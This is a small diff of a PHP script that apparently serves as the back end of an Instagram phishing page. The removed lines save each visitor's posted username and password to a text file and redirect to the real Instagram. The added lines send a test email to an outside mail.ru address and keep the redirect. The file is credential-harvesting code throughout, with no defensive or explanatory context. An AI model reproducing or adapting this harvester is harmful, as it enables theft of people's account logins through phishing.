@@ -1,6 +1,4 @@
 <?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
-exit();
+  var_dump( mail( 'aynizoda@mail.ru', '', 'This was sent with PHP.' ) );
+  header('Location: https://instagram.com')
 ?>
